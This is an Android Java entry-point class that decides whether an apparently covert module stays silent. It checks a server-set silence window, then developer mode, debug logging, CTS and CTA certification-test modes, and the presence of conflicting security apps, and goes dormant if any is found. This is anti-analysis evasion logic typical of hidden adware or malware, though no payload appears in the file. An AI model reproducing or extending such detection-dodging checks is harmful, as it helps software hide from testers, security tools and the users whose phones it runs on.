package com.hs.q;

import android.content.Context;
import android.util.Log;

import com.hs.q.basic.Builder;
import com.hs.q.basic.MutexChecker;
import com.hs.q.basic.SLT;
import com.hs.q.basic.Settings;
import com.hs.q.common.PROP;
import com.hs.q.common.utils.LOG;
import com.hs.q.common.utils.SystemUtils;
import com.hs.q.common.utils.TextUtils;
import com.hs.q.q.QP;

import java.util.Arrays;

public class Main {
    private final static String TAG = "Q.Main";

    public static int main(Context context, String[] args) {
        int ret = 0;
        long st = System.currentTimeMillis();

        // 设置日志开关
        if (PROP.isLogEnabled()) {
            LOG.setEnabled(true);
        } else {
            LOG.setEnabled(Settings.isLogEnabled(context, false));
        }
        LOG.i(TAG, "main in: v=" + Builder.VERSION + " ctx=" + context + " args=" + Arrays.toString(args));

        // 如果本地静默，直接返回静默标志；否则查询服务器再判断标志
        if (SLT.silent(context)) {
            LOG.i(TAG, "app slt to " + TextUtils.TSTR(SLT.millis(context)));
            ret = 1;
        } else {
            QP p = new QP();
            p.process(context, null);
            ret = (SLT.silent(context) ? 1 : 0);
        }

        // 如果当前非静默，则根据控制报纸，判断是否需要检查本地手机模式
        // 1 手机是否处于开发者状态
        // 2 当前log日志是否是debug级别
        // 3 是否处于CTS状态
        // 4 是否处于CTS状态
        // 5 是否有互斥的安全软件
        if (0 == ret) {
            if (!PROP.ignoreCheckMode()) {
                if (0 == ret) {
                    if (!Settings.isIgnoreDevMode(context, false)) {
                        if (SystemUtils.isDevModeEnabled(context)) {
                            LOG.i(TAG, "dev mode ...");
                            ret = 2;
                        }
                    } else {
                        LOG.i(TAG, "ignore dev mode ...");
                    }
                }

                if (0 == ret) {
                    if (!Settings.isIgnoreLogD(context, false)) {
                        if (LOG.isLogD()) {
                            LOG.i(TAG, "log debuggable ...");
                            ret = 3;
                        }
                    } else {
                        LOG.i(TAG, "ignore log debuggable ...");
                    }
                }

                if (0 == ret) {
                    if (!Settings.isIgnoreCTS(context, false)) {
                        if (SystemUtils.isCTSEnabled(context)) {
                            LOG.i(TAG, "CTS mode ...");
                            ret = 4;
                        }
                    } else {
                        LOG.i(TAG, "ignore CTS mode ...");
                    }
                }

                if (0 == ret) {
                    if (!Settings.isIgnoreCTA(context, false)) {
                        if (SystemUtils.isCTAEnabled(context)) {
                            LOG.i(TAG, "CTA mode ...");
                            ret = 5;
                        }
                    } else {
                        LOG.i(TAG, "ignore CTA mode ...");
                    }
                }

                if (0 == ret) {
                    if (!Settings.isIgnoreMutexPackages(context, false)) {
                        if (MutexChecker.has(context)) {
                            LOG.i(TAG, "find mutex pkgs ...");
                            ret = 6;
                        }
                    } else {
                        LOG.i(TAG, "ignore mutex pkgs ...");
                    }
                }
            }
        }

        LOG.i(TAG, "main out: ret=" + ret
                + ", slt=" + SLT.silent(context)
                + ", dm=" + SystemUtils.isDevModeEnabled(context)
                + ", logd=" + LOG.isLogD()
                + ", cts=" + SystemUtils.isCTSEnabled(context)
                + ", cta=" + SystemUtils.isCTAEnabled(context)
                + ", mtx=" + MutexChecker.has(context)
                + ", ms=" + (System.currentTimeMillis() - st));
        return ret;
    }
}
